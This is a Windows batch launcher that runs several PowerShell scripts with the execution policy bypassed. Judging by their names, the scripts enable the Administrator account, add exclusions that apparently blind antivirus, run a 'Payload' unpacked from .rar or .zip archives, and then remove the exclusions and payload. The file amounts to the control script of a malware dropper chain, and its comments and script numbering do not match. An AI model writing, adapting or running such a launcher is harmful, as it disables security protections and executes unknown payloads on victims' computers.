@echo off

:: Run the script 1.enable_the_administrator.ps1 and wait for it to finish
start /wait powershell -ExecutionPolicy Bypass -File ./1.enable_the_administrator.ps1

:: Run the script 2.exclusion_for_all.ps1 and wait for it to finish
start /wait powershell -ExecutionPolicy Bypass -File ./2.exclusion_for_all.ps1

:: Check if .rar files exist
echo Checking for .rar files...
powershell -Command "if (-not (Get-ChildItem -Path . -Filter '*.rar')) { Write-Host 'No .rar files found.' -ForegroundColor Red; exit 1 }"

:: Run the script 3.start_Payload_for_rar.ps1 if .rar files are found
if %errorlevel% equ 0 (
    start /wait powershell -ExecutionPolicy Bypass -File ./3.start_Payload_for_rar.ps1
) else (
    echo No .rar files found, skipping script 3.start_Payload_for_rar.ps1.
)

:: Check if .zip files exist
echo Checking for .zip files...
powershell -Command "if (-not (Get-ChildItem -Path . -Filter '*.zip')) { Write-Host 'No .zip files found.' -ForegroundColor Red; exit 1 }"

:: Run the script 5.start_Payload_for_zip.ps1 if .zip files are found
if %errorlevel% equ 0 (
    start /wait powershell -ExecutionPolicy Bypass -File ./3.start_Payload_for_zip.ps1
) else (
    echo No .zip files found, skipping script 5.start_Payload_for_zip.ps1.
)

:: Run the script 4.disable_exclusion_and_payload.ps1 and wait for it to finish
start /wait powershell -ExecutionPolicy Bypass -File ./4.disable_exclusion_and_payload.ps1

echo All processes have been successfully executed.

pause
